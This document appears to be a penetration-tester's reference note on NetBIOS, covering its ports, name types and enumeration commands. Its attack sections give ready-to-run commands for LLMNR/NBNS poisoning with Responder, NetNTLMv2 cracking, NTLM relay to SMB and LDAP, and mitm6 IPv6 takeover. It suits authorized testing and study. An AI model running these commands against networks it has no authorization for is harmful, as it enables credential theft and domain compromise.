# NetBIOS

#NetBIOS #NetworkBasicInputOutputSystem #SMB #LLMNR #namepoisoning

## What is NetBIOS?
Network Basic Input/Output System — the legacy Windows name-resolution and session API that predates universal DNS and still runs on most internal networks. It underlies SMB over TCP 139 on older clients and, crucially, provides the **NBNS broadcast fallback** that (alongside LLMNR) lets a rogue host answer name queries and capture NTLM authentication — the single most reliable way onto an internal AD network. Three services: Name Service, Datagram Service, Session Service.

- Port **UDP/TCP 137** — NetBIOS Name Service (NBNS)
- Port **UDP 138** — NetBIOS Datagram Service
- Port **TCP 139** — NetBIOS Session Service (SMB over NetBIOS)
- Companion broadcast protocols poisoned alongside it: **LLMNR** (UDP 5355), **mDNS** (UDP 5353)

---

## Tools

| Tool | Use |
|---|---|
| [[Tools/Scanning/NMAP\|NMAP]] | `nbstat` NSE — name table on UDP 137 |
| [[Tools/Network/nbtscan\|nbtscan]] | Bulk NBNS subnet sweep (names, users, DCs) |
| [[Tools/Local System Management/RPCclient\|RPCclient]] | Null-session enum over 139 (`enumdomusers`, `queryuser`) |
| [[Tools/Lateral Movement/smbclient\|smbclient]] | Share access over NetBIOS 139 |
| [[Tools/Lateral Movement/enum4linux\|enum4linux]] | Wraps rpcclient/nmblookup for one-shot enum |
| [[Tools/Lateral Movement/NetExec\|NetExec]] | `nxc smb --rid-brute` user enum, spray, relay-list |
| [[Tools/Lateral Movement/impacket\|impacket]] | `lookupsid.py` RID cycling over null session |
| [[Tools/Lateral Movement/responder\|responder]] | LLMNR/NBNS/mDNS poisoning → NetNTLM capture |
| [[Tools/Lateral Movement/mitm6\|mitm6]] | IPv6/DHCPv6 + WPAD takeover (the modern companion to responder) |
| [[Tools/Lateral Movement/inveigh\|inveigh]] | Windows-side LLMNR/NBNS poisoner |
| [[Tools/Auth/hashcat\|hashcat]] | Crack captured NetNTLMv2 (`-m 5600`) |
| [[Tools/Payloads & Shells/metasploit\|metasploit]] | `auxiliary/scanner/netbios/nbname` name scan |

Also used inline: `nmblookup` (Samba NBNS client), `RunFinger.py` (Responder's target-fingerprint helper).

---

## NetBIOS Name Types

| Suffix | Name Type | Description |
|---|---|---|
| `<00>` | Workstation | Host registered name |
| `<20>` | File Server | Server service (SMB shares present) |
| `<03>` | Messenger | Messenger service / logged-on user |
| `<1B>` | Domain Master Browser | PDC emulator |
| `<1C>` | Domain Controllers | DC group — **flags DCs on a sweep** |
| `<1D>` | Master Browser | Subnet master browser |

---

## Enumeration

```bash
# Nmap
nmap -sU -p 137 --script nbstat <target>
nmap -p 137,138,139 -sU -sV --script nbstat,smb-os-discovery <target>

# nbtscan — bulk NetBIOS enumeration
nbtscan <target>
nbtscan <subnet>/24
nbtscan -r <subnet>/24        # source from UDP/137 (root) — bypasses some filters

# nmblookup (Samba)
nmblookup -A <target>         # name table for a host
nmblookup -S <netbios_name>   # resolve a name

# NetExec — RID-brute user enum (works where null sessions are limited)
nxc smb <target> --rid-brute
```

---

## Connect / Access

```bash
# smbclient over NetBIOS (port 139)
smbclient -L //<target> -p 139 -N
smbclient //<target>/<share> -p 139 -U <user>%<pass>

# rpcclient — null session (port 139)
rpcclient -U "" -N <target>
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
rpcclient $> querydominfo
rpcclient $> netshareenumall

# Metasploit
use auxiliary/scanner/netbios/nbname
```

---

## Attack Vectors

### LLMNR/NBNS Poisoning → NetNTLM Capture (Responder)

When DNS resolution fails, Windows falls back to LLMNR then NBNS **broadcast** — any host on the segment can answer. Responder answers every query as itself; the victim then authenticates to you, handing over a NetNTLMv2 hash.

```bash
# Capture (analyse first with -A to be sure you're allowed to poison)
sudo responder -I <iface> -A            # passive/analyse — see who's asking, poison nothing
sudo responder -I <iface> -wf           # active: WPAD proxy + fingerprint

# Responder captures NetNTLMv2 from: DNS→LLMNR/NBNS fallback, UNC path access, WPAD auto-discovery
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
```

### Poison-and-Relay (no cracking needed)

If the captured account is privileged on another host and SMB signing is off there, **relay** instead of cracking. Turn Responder's own SMB/HTTP servers **off** so ntlmrelayx can take the connection:

```bash
# In /etc/responder/Responder.conf set: SMB = Off, HTTP = Off
sudo responder -I <iface>                      # poisoning only
ntlmrelayx.py -tf targets.txt -smb2support     # relay to SMB signing-off hosts
ntlmrelayx.py -t ldap://<dc> --delegate-access # or relay to LDAP for RBCD
```

### mitm6 — IPv6 Takeover + WPAD

```bash
# Windows prefers IPv6 and asks for a DHCPv6 lease constantly. mitm6 answers, becomes the
# victim's DNS server, and points WPAD at you → relay to LDAP/S for domain takeover.
mitm6 -d <domain>
ntlmrelayx.py -6 -t ldaps://<dc> -wh wpad.<domain> --delegate-access
```

### Null Session Enumeration (Legacy)

```bash
# Windows XP/2000 era — may still exist on old systems / appliances
net use \\<target>\IPC$ "" /u:""

rpcclient -U "" -N <target>
rpcclient $> enumdomusers
rpcclient $> querydominfo
rpcclient $> netshareenumall
rpcclient $> queryuser <RID>

# enum4linux (wraps rpcclient/nmblookup/smbclient)
enum4linux -a <target>
```

### RID Cycling

```bash
# impacket-lookupsid over a null (or authenticated) session
impacket-lookupsid ''@<target>                       # null session
impacket-lookupsid <domain>/<user>:<pass>@<target>

# NetExec equivalent
nxc smb <target> -u '' -p '' --rid-brute
```

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| LLMNR / NBNS / mDNS enabled | NetNTLM hash capture via poisoning → crack or relay |
| SMB signing not enforced | Poisoned/relayed auth → remote code execution |
| Null sessions allowed | Unauthenticated user/share enumeration |
| IPv6 enabled but unmanaged (no DHCPv6 guard) | mitm6 WPAD takeover → domain compromise |
| NetBIOS enabled on internet-facing hosts | Name-resolution attacks / info leak |
| SMBv1 enabled | EternalBlue + legacy NetBIOS session attacks |

---

## Quick Reference

| Goal | Command |
|---|---|
| Scan subnet | `nbtscan <subnet>/24` |
| Lookup host | `nmblookup -A host` |
| Nmap name table | `nmap -sU -p 137 --script nbstat host` |
| Null session | `rpcclient -U "" -N host` |
| Enum users (null) | `rpcclient $> enumdomusers` |
| RID brute | `impacket-lookupsid ''@host` / `nxc smb host --rid-brute` |
| Poison + capture | `sudo responder -I iface -wf` |
| Poison + relay | `responder` (SMB/HTTP off) + `ntlmrelayx.py -tf targets.txt` |
| IPv6 takeover | `mitm6 -d domain` + `ntlmrelayx.py -6 -t ldaps://dc` |
| Crack hash | `hashcat -m 5600 hashes.txt rockyou.txt` |

---

> [!note] **See also** — name-resolution/poisoning sibling [[Services/Network management/DNS|DNS]] (WPAD/wildcard and NBNS/LLMNR are the same responder-fed capture surface); captured/relayed auth lands on [[Services/File Xfer/SMB|SMB]] and [[Services/Network management/LDAP|LDAP]] (RBCD via relay); a rogue [[Services/Network management/NTP|NTP]] source needs the same on-path position as mitm6.

---

*Created: 2026-07-13*
*Updated: 2026-09-23*
*Model: claude-opus-4-8*
